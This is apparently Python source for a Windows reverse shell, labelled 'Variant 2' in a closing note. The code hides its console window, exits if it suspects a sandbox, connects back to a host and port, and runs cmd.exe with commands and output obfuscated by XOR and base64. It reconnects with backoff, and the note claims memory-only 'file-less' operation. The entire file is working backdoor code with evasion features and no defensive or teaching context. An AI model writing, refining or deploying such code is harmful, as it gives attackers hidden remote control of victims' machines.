import socket, subprocess, os, time, sys, base64, random
import ctypes

HOST = "127.0.0.1"
PORT = 4444
XOR_KEY = b"Sophia1337"

def xor(data):
    return bytes(a ^ b for a, b in zip(data * (len(data) // len(XOR_KEY) + 1), XOR_KEY))

def is_sandbox():
    try:
        ppid = ctypes.windll.kernel32.GetCurrentProcessId()
        # Very naive – just checking if parent looks suspicious
        return "python" in os.getenv("PARENT_PROCESS", "").lower() or os.getppid() == 0
    except:
        return False

def connect():
    backoff = 3
    while True:
        try:
            s = socket.socket()
            s.settimeout(8)
            s.connect((HOST, PORT))
            return s
        except:
            time.sleep(backoff)
            backoff = min(backoff * 1.5 + random.uniform(0, 2), 120)

def main():
    if is_sandbox():
        sys.exit(0)

    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    while True:
        try:
            sock = connect()

            p = subprocess.Popen(
                ["cmd.exe"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=True,
                bufsize=0
            )

            while True:
                try:
                    data = sock.recv(16384)
                    if not data: break
                    plain = xor(base64.b64decode(data))
                    p.stdin.write(plain)
                    p.stdin.flush()
                except:
                    break

                try:
                    out = p.stdout.read(16384)
                    if out:
                        enc = base64.b64encode(xor(out))
                        sock.sendall(enc)
                except:
                    break

            sock.close()
            p.kill()
        except:
            time.sleep(3 + random.random() * 4)

if __name__ == "__main__":
    main()



'''Variant 2 – Encrypted communication + file-less style + parent check
Main changes compared to Variant 1:

Added simple XOR + base64 encryption for the entire communication channel
Added very basic parent process check (tries to detect if running under common sandboxes / debuggers)
Removed file-based persistence (file-less style – lives only in memory after first run)
Uses bigger buffer + non-blocking style for slightly better responsiveness
Different reconnect logic with exponential backoff light'''